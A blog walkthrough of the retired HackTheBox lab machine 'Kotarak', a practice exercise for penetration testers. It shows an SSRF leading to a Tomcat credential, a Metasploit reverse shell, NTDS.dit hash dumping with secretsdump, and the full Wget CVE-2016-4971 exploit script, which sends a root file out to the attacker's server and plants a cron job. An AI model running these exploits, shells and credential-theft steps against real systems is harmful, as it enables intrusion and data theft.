---
layout: post
title: Hackthebox Kotarak Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2020-01-14/kotarak-badge.png)

#### Retired date: 2018/03/10

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
For the practice, solve the left boxes in the list of OSCP like boxes and this is a walkthrough of a box "Kotarak".<br>
![placeholder](https://inar1.github.io/public/images/general/oscp_like_box.png)

# Solution
### 1. Initial Enumeration

#### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.55 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-14 00:42 EET
Nmap scan report for 10.10.10.55
Host is up (0.045s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods:
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.28 seconds

root@kali:~#
{% endhighlight %}

#### Gobuster port 8080:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.55:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.55:8080/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2020/01/14 01:55:44 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
/RELEASE-NOTES.txt (Status: 200)
===============================================================
2020/01/14 03:01:44 Finished
===============================================================

root@kali:~# 
{% endhighlight %}

#### Gobuster port 60000:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.55:60000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.55:60000/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,php
[+] Timeout:        10s
===============================================================
2020/01/14 00:46:42 Starting gobuster
===============================================================
/info.php (Status: 200)
/index.php (Status: 200)
/url.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/01/14 01:52:27 Finished
===============================================================

root@kali:~# 
{% endhighlight %}


### 2. Getting User

We have 2 interesting services.<br>
On the port 8080, we have Tomcat and on the port 60000, we can find a "Private Browser".
![placeholder](https://inar1.github.io/public/images/2020-01-14/2020-01-14-14-03-25.png)

By adding a parameter, we can view the prohibited web pages of Kotarak like "server-status".<br>
Meaning, this web application has a SSRF (Server Side Request Forgery) vulnerability and an attacker can view the hidden services.<br>
The interesting point is that "Kotarak" has a running service on "127.0.0.1:888".
#### Request to see "http://10.10.10.55:60000":
{% highlight shell %}
http://10.10.10.55:60000/url.php?path=http://localhost:60000/server-status
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2020-01-14/2020-01-14-14-11-44.png)

Then,take a look at "127.0.0.1:888" by sending the following request to the native web browser.
#### Request to see "http://10.10.10.55:8888":
{% highlight shell %}
http://10.10.10.55:60000/url.php?path=http://localhost:888
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2020-01-14/2020-01-14-14-12-20.png)

To go to each hyperlink, sounds we need to add "?doc=backup" parameter.<br>
So, "http://localhost:888/?doc=backup" is the appropriate URL to access to these links.
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.55:60000/url.php?path=http://localhost:888 | grep backup
    <td width="27"><a href="?doc=backup"  class="tableElement"><img src="inc/images/generic.png" alt="dir" width="22" height="22" border="0"></a></td>
    <td class="tableElement"><a href="?doc=backup"  class="tableElement">backup</a></td>

root@kali:~#
{% endhighlight %}

Then, try to access the "backup" file on the port 888.<br>
Sounds it's empty page but by taking a look at source code, we can find a hidden credential.
![placeholder](https://inar1.github.io/public/images/2020-01-14/2020-01-14-21-06-09.png)
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.55:60000/url.php?path=localhost:888/?doc=backup | grep password
  you must define such a user - the username and password are arbitrary. It is
  them. You will also need to set the passwords to something appropriate.
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
    <user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>

root@kali:~#
{% endhighlight %}

By going to "http://10.10.10.55:8080/manager/html" and try some possible password combination,<br>
we can figure out the following credential is available for tomcat.
{% highlight shell %}
admin:3@g01PdhB!
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2020-01-14/2020-01-14-14-50-37.png)

Since we have an exploit for tomcat, take advantage of the credential and get the user shell of "tomcat".
{% highlight shell %}
msf5 > use exploit/multi/http/tomcat_mgr_upload 
msf5 exploit(multi/http/tomcat_mgr_upload) > set httpusername admin
httpusername => admin
msf5 exploit(multi/http/tomcat_mgr_upload) > set httppassword 3@g01PdhB!
httppassword => 3@g01PdhB!
msf5 exploit(multi/http/tomcat_mgr_upload) > set rhost 10.10.10.55
rhost => 10.10.10.55
msf5 exploit(multi/http/tomcat_mgr_upload) > set rport 8080
rport => 8080
msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.10.14.36:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying 63aGm6...
[*] Executing 63aGm6...
[*] Undeploying 63aGm6 ...
[*] Sending stage (53906 bytes) to 10.10.10.55
[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.10.10.55:53600) at 2020-01-14 14:53:18 +0200

meterpreter > getuid
Server username: tomcat

meterpreter > 
{% endhighlight %}

It is still not possible to get the "user.txt".<br>
However, we can get some Interesting files.
{% highlight shell %}
meterpreter > pwd
/home/tomcat/to_archive/pentest_data
meterpreter > ls
Listing: /home/tomcat/to_archive/pentest_data
=============================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  16793600  fil   2017-07-21 19:16:23 +0300  20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
100666/rw-rw-rw-  12189696  fil   2017-07-21 19:16:45 +0300  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin

meterpreter >
{% endhighlight %}

We can download these files by "download" command of  meterpreter shell.
{% highlight shell %}
meterpreter > download 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit

---

meterpreter > download 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
{% endhighlight %}

These files look like NTDS file for database of Active directory.<br>
.dit stands for "Directory Information Tree" and the hierarchy of network objects and access permissiona are saved.<br>
To confirm what are these files, we can use "file" command.<br>
{% highlight shell %}
root@kali:~# file 2017072111463*
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: Extensible storage engine DataBase, version 0x620, checksum 0x16d44752, page size 8192, DirtyShutdown, Windows version 6.1
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above

root@kali:~#
{% endhighlight %}

Since we had a NTDS file and system hive, we can extract the password hash of the users.<br>
We can refer <a href="https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/">this article</a> for the additional information.
{% highlight shell %}
root@kali:~# impacket-secretsdump -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274
Administrator:des-cbc-md5:75375eda54757c2f
WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5
WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd
krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
krbtgt:des-cbc-md5:10ef08047a862046
krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee
WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908
WIN2K8$:des-cbc-md5:d352a8d3a7a7380b
WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487
WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded
WINXP1$:des-cbc-md5:984a40d5f4a815f2
WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279
WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01
WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772
WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
WIN7$:des-cbc-md5:89a1673723ad9180
WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c
atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
atanas:des-cbc-md5:6b80e391f113542a
[*] Cleaning up... 

root@kali:~# 
{% endhighlight %}

We can crack some of the hashes by using <a href="https://crackstation.net/">CrackStation</a>
![placeholder](https://inar1.github.io/public/images/2020-01-14/2020-01-14-15-07-49.png)
![placeholder](https://inar1.github.io/public/images/2020-01-14/2020-01-14-15-08-17.png)

Now we had the following credentials.
{% highlight shell %}
admin:f16tomcat!
atanas:Password123!
{% endhighlight %}

Then, move to the user "atanas".<br>
This time, the following credential worked.
{% highlight shell %}
atanas:f16tomcat!
{% endhighlight %}
{% highlight shell %}
meterpreter > execute -i -f /bin/bash
Process 3 created.
Channel 3 created.

python -c 'import pty;pty.spawn("/bin/bash")'

tomcat@kotarak-dmz:/$ su atanas
su atanas
Password: f16tomcat!

atanas@kotarak-dmz:/$
{% endhighlight %}

"user.txt" is in the directory "/home/atanas".
{% highlight shell %}
atanas@kotarak-dmz:~$ pwd
pwd
/home/atanas

atanas@kotarak-dmz:~$ cat user.txt
cat user.txt
93f844f50491ef797c9c1b601b4bece8

atanas@kotarak-dmz:~$ 
{% endhighlight %}


### 3. Getting Root

Even though "atanas" is a general user, we can take a look at the "/root" directory as "atanas".<br>
In that directory, we have 2 interesting files "flag.txt" and "app.log".

#### flag.txt:
{% highlight shell %}
atanas@kotarak-dmz:/root$ cat flag.txt
cat flag.txt
Getting closer! But what you are looking for can't be found here.

atanas@kotarak-dmz:/root$
{% endhighlight %}

#### app.log:
{% highlight shell %}
atanas@kotarak-dmz:/root$ cat app.log
cat app.log
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"

atanas@kotarak-dmz:/root$
{% endhighlight %}

Sounds "10.0.3.133" is continuously sending GET request to this host with Wget 1.16.<br>
By googling like following,<br>
we can find a vulnerability <a href="https://www.exploit-db.com/exploits/40064">GNU Wget 1.18 - Arbitrary File Upload / Remote Code Execution</a>.
{% highlight shell %}
wget 1.16 vulnerability
{% endhighlight %}

According to the vulnerability description, we have to create a .wgetrc file.
{% highlight shell %}
root@kali:~# cat .wgetrc 
post_file = /root/root.txt
output_document = /etc/cron.d/wget-root-shell

root@kali:~# 
{% endhighlight %}

After that, install pyftpdlib and launch the FTP server with the following command.
{% highlight shell %}
root@kali:~# pip install pyftpdlib

---

root@kali:~# python -m pyftpdlib -p 21 -w
/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2020-01-14 18:13:11] >>> starting FTP server on 0.0.0.0:21, pid=111918 <<<
[I 2020-01-14 18:13:11] concurrency model: async
[I 2020-01-14 18:13:11] masquerade (NAT) address: None
[I 2020-01-14 18:13:11] passive ports: None
{% endhighlight %}

Also, according to the description, we need a python script "wget-exploit.py"
{% highlight shell %}
root@kali:~# cat wget-exploit.py 
#!/usr/bin/env python

#
# Wget 1.18 < Arbitrary File Upload Exploit
# Dawid Golunski
# dawid( at )legalhackers.com
#
# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
#
# CVE-2016-4971 
#

import SimpleHTTPServer
import SocketServer
import socket;

class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       # This takes care of sending .wgetrc

       print "We have a volunteer requesting " + self.path + " by GET :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
          print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
       self.send_response(301)
       new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
       print "Sending redirect to %s \n"%(new_path)
       self.send_header('Location', new_path)
       self.end_headers()

   def do_POST(self):
       # In here we will receive extracted file and install a PoC cronjob

       print "We have a volunteer requesting " + self.path + " by POST :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
          print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       content_len = int(self.headers.getheader('content-length', 0))
       post_body = self.rfile.read(content_len)
       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

       print "Sending back a cronjob script as a thank-you for the file..." 
       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
       self.send_response(200)
       self.send_header('Content-type', 'text/plain')
       self.end_headers()
       self.wfile.write(ROOT_CRON)

       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"

       return

HTTP_LISTEN_IP = '192.168.57.1'
HTTP_LISTEN_PORT = 80
FTP_HOST = '192.168.57.1'
FTP_PORT = 21

ROOT_CRON = "* * * * * root /usr/bin/id > /root/hacked-via-wget \n"

handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print "Ready? Is your FTP server running?"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
else:
   print "FTP is down :( Exiting."
   exit(1)

print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

handler.serve_forever()
{% endhighlight %}

However, the above script is just an example and we have to modify the following points of the script.
{% highlight shell %}
root@kali:~# cat -n wget-exploit.py | head -n 65 | tail -n 4
    62	HTTP_LISTEN_IP = ''
    63	HTTP_LISTEN_PORT = 80
    64	FTP_HOST = '10.10.14.36'
    65	FTP_PORT = 21
{% endhighlight %}

Then, go to a directory that we have write permission on the "Kotarak".<br>
Upload the python script "wget-exploit.py".
{% highlight shell %}
meterpreter > pwd
/tmp
meterpreter > upload ./wget-exploit.py
[*] uploading  : ./wget-exploit.py -> wget-exploit.py
[*] Uploaded -1.00 B of 2.77 KiB (-0.04%): ./wget-exploit.py -> wget-exploit.py
[*] uploaded   : ./wget-exploit.py -> wget-exploit.py

meterpreter > 
{% endhighlight %}

Generally, we can't use the port 80 as a general user.<br>
But, we can obtain the purpose by using "authbind" command.<br>
In the POST request, we can see the content of "root.txt".
{% highlight shell %}
atanas@kotarak-dmz:/tmp$ authbind --deep python wget-exploit.py
authbind --deep python wget-exploit.py
Ready? Is your FTP server running?
FTP found open on 10.10.14.36:21. Let's go then

Serving wget exploit on port 80...


We have a volunteer requesting /archive.tar.gz by GET :)

Uploading .wgetrc via ftp redirect vuln. It should land in /root 

10.0.3.133 - - [14/Jan/2020 12:12:01] "GET /archive.tar.gz HTTP/1.1" 301 -
Sending redirect to ftp://anonymous@10.10.14.36:21/.wgetrc 

We have a volunteer requesting /archive.tar.gz by POST :)

Received POST from wget, this should be the extracted /etc/shadow file: 

---[begin]---
 950d1425795dfd38272c93ccbb63ae2c

---[eof]---


Sending back a cronjob script as a thank-you for the file...
It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)
10.0.3.133 - - [14/Jan/2020 12:14:01] "POST /archive.tar.gz HTTP/1.1" 200 -

File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) 
{% endhighlight %}

#### Output of python local FTP server:
{% highlight shell %}
root@kali:~# python -m pyftpdlib -p 21 -w
/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2020-01-14 19:06:59] >>> starting FTP server on 0.0.0.0:21, pid=115096 <<<
[I 2020-01-14 19:06:59] concurrency model: async
[I 2020-01-14 19:06:59] masquerade (NAT) address: None
[I 2020-01-14 19:06:59] passive ports: None
[I 2020-01-14 19:07:11] 10.10.10.55:54274-[] FTP session opened (connect)
[I 2020-01-14 19:08:35] 10.10.10.55:50788-[] FTP session opened (connect)
[I 2020-01-14 19:08:35] 10.10.10.55:50788-[anonymous] USER 'anonymous' logged in.
[I 2020-01-14 19:08:35] 10.10.10.55:50788-[anonymous] RETR /root/.wgetrc completed=1 bytes=73 seconds=0.002
[I 2020-01-14 19:08:35] 10.10.10.55:50788-[anonymous] FTP session closed (disconnect).
{% endhighlight %}
